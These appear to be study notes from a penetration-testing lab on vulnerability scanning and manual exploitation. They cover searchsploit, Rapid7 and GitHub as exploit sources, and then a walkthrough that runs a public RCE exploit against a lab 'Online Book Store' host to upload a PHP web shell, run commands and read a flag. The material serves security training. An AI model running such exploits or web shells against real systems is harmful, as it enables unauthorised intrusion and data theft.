There is a myriad of tools and services available in cybersecurity for vulnerability scanning. Ranging from being commercial (and footing a heavy bill) to open-source and free, vulnerability scanners are convenient means of quickly canvassing an application for flaws.

## **Automated Vs. Manual Vulnerability 
The vulnerability scanner [Nessus](https://www.tenable.com/products/nessus) has both a free (community) edition and commercial.
![[Pasted image 20240807125615.png]]

| **Advantage**                                                                                               | **Disadvantage**                                                                                                                          |
| ----------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------- |
| Automated scans are easy to repeat, and the results can be shared within a team with ease.                  | People can often become reliant on these tools.                                                                                           |
| These scanners are quick and can test numerous applications efficiently.                                    | They are extremely "loud" and produce a lot of traffic and logging. This is not good if you are trying to bypass firewalls and the likes. |
| Open-source solutions exist.                                                                                | Open-source solutions are often basic and require expensive licenses to have useful features.                                             |
| Automated scanners cover a wide range of different vulnerabilities that may be hard to manually search for. | They often do not find every vulnerability on an application.                                                                             |

Manual scanning for vulnerabilities is often the weapon of choice by a penetration tester when testing individual applications or programs. In fact, manual scanning will involve searching for the same vulnerabilities and uses similar techniques as automated scanning.


Ultimately, both techniques involve testing an application or program for vulnerabilities. These vulnerabilities include:

| **Vulnerability**          | **Description**                                                                                                                                                                                |
| -------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Security Misconfigurations | Security misconfigurations involve vulnerabilities that are due to developer oversight. For example, exposing server information in messages between the application and an attacker.          |
| Broken Access Control      | This vulnerability occurs when an attacker is able to access parts of an application that they are not supposed to be able to otherwise.                                                       |
| Insecure Deserialization   | This is the insecure processing of data that is sent across an application. An attacker may be able to pass malicious code to the application, where it will then be executed.                 |
| Injection                  | An Injection vulnerability exists when an attacker is able to input malicious data into an application. This is due to the failure of not ensuring (known as sanitising) input is not harmful. |

## **Manual Exploits**

### Rapid7
Much like other services such as Exploit DB and NVD, Rapid7 is a vulnerability research database. The only difference being that this database also acts as an exploit database. Using this service, you can filter by type of vulnerability (I.e. application and operating system).

![[Pasted image 20240807144609.png]]

Additionally, the database contains instructions for exploiting applications using the Metasploit tool. For example, this entry on [Rapid7](https://www.rapid7.com/db/) is for “[Wordpress Plugin SP Project & Document](https://www.rapid7.com/db/modules/exploit/multi/http/wp_plugin_sp_project_document_rce/)”, where we can see instructions on how to use an exploit module to abuse this vulnerability:
	![[Pasted image 20240807144700.png]]

### GitHub
 The site is used to host and share the source code of applications to allow a collaborative effort. However, security researchers have taken to this platform because of the aforementioned reasons as well. Security researchers store & share PoC’s (Proof of Concept) on GitHub, turning it into an exploit database in this context.
 
 GitHub uses a tagging and keyword system, meaning that we can search GitHub by keywords such as “PoC”, “vulnerability”, and many more. At the time of writing, there are 9,682 repositories with the keyword “cve”. We are also able to filter the results by programming language.
	 ![[Pasted image 20240807144910.png]]

### Searchsploit
Searchsploit is a tool that is available on popular pentesting distributions such as Kali Linux. This tool is an offline copy of Exploit-DB, containing copies of exploits on your system. 

You are able to search searchsploit by application name and/or vulnerability type. For example, in the snippet below, we are searching searchsploit for exploits relating to Wordpress that we can use:
```shell-session
searchsploit wordpress
WordPress Theme Think Responsive 1.0 - Arbitr | php/webapps/29332.txt
WordPress Theme This Way - 'upload_settings_i | php/webapps/38820.php
WordPress Theme Toolbox - 'mls' SQL Injection | php/webapps/38077.txt
WordPress Theme Trending 0.1 - 'cpage' Cross- | php/webapps/36195.txt
WordPress Theme Uncode 1.3.1 - Arbitrary File | php/webapps/39895.php
WordPress Theme Urban City - 'download.php' A | php/webapps/39296.txt
WordPress Theme Web Minimalist 1.1 - 'index.p | php/webapps/36184.txt
WordPress Theme White-Label Framework 2.0.6 - | php/webapps/38105.txt
WordPress Theme Wp-ImageZoom - 'id' SQL Injec | php/webapps/38063.txt
WordPress Theme Zoner Real Estate - 4.1.1 Per | php/webapps/47436.txt
```

## **Example of Manual Exploitation**
One of the most effective vulnerabilities that we can exploit is the ability to execute commands on the target that is running the vulnerable application or service.

Being able to execute commands on the target that is running the vulnerable application or service will allow us to read files or execute commands that we previously wouldn’t be able to perform using the application or service alone. Additionally, we can abuse this to gain what is known as a `foothold` to the machine. A `foothold` is an access to the vulnerable machine’s console, where we can then begin to exploit other applications or machines on the network.

*Note*:
	Exploits rarely come out of the box and are ready to be used. They often require some configuration before they will work for our environment or target. The level of configuration will vary upon the exploit, so you will often find multiple exploits for the same vulnerability on an application. 

In the snippet below, we can see that a few options have been changed to reflect the IP address of the machine that we are attacking from.

Exploit (Before)
```shell-session
nano exploit.py
mymachine="192.168.1.10"
port="1337"
```

Modifying an Exploit (After)
```shell-session
nano exploit.py
mymachine="10.13.37.10"
port="1337"
```

Once we have configured the exploit correctly, let’s further read this exploit to understand how to use it:
```shell-session
exploit.py --help
To use this exploit, provide the following arguments:
-u The URL of the application
-c the command that you wish to execute
```

We are now ready to use this exploit on the vulnerable machine. We are going to do the following:
1. Use the exploit to upload a malicious file to the vulnerable application containing whatever command we wish to execute, where the web server will run this malicious file to execute the code.
2. The file will first contain a basic command that we will use to verify that the exploit has worked.
```shell-session
exploit.py -u http://10.10.10.10 -c "whoami"
www-data
```
4. Then we are going to read the contents of a file located on the vulnerable machine.
```shell-session
exploit.py -u http://10.10.10.10 -c "cat flag.txt"
THM{EXPLOIT_COMPLETE}
```

## **Practical: Manual Exploitation**

1) Finding the version of the running application![[Pasted image 20240807153626.png]]

Searching for an exploit for the version in cause:
```
root@ip-10-10-113-30:~# searchsploit online book store
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
GotoCode Online Bookstore - Multiple Vulnerab | asp/webapps/17921.txt
Online Book Store 1.0 - 'bookisbn' SQL Inject | php/webapps/47922.txt
Online Book Store 1.0 - 'id' SQL Injection    | php/webapps/48775.txt
Online Book Store 1.0 - Arbitrary File Upload | php/webapps/47928.txt
Online Book Store 1.0 - Unauthenticated Remot | php/webapps/47887.py
Online Event Booking and Reservation System 1 | php/webapps/50450.txt
---------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Copying the exploit file on local machine
```
root@ip-10-10-113-30:~# searchsploit -m 47887.py
  Exploit: Online Book Store 1.0 - Unauthenticated Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47887
     Path: /opt/exploitdb/exploits/php/webapps/47887.py
    Codes: N/A
 Verified: True
File Type: ASCII text

Copied to: /root/47887.py
```

Looking into the script file  (nano // -help)
```
root@ip-10-10-113-30:~# python3 47887.py -h
usage: 47887.py [-h] url

positional arguments:
  url         The URL of the target.

optional arguments:
  -h, --help  show this help message and exit
```
![[Pasted image 20240807154306.png]]

Running the exploit file accordingly:
```
root@ip-10-10-113-30:~# python3 47887.py http://10.10.69.132  !!!
> Attempting to upload PHP web shell...
> Verifying shell upload...
> Web shell uploaded to http://10.10.69.132/bootstrap/img/o5KiH8doVD.php
> Example command usage: http://10.10.69.132/bootstrap/img/o5KiH8doVD.php?cmd=whoami
> Do you wish to launch a shell here? (y/n): y 
RCE $ ls           !!!
OyWjgNLIbq.php
android_studio.jpg
beauty_js.jpg
c_14_quick.jpg
c_sharp_6.jpg
doing_good.jpg
flag.txt         !!!
img1.jpg
img2.jpg
img3.jpg
kotlin_250x250.png
logic_program.jpg
mobile_app.jpg
o5KiH8doVD.php
pro_asp4.jpg
pro_js.jpg
t73N0AoVQ2.php
unnamed.png
web_app_dev.jpg

RCE $ cat flag.txt  !!!
```

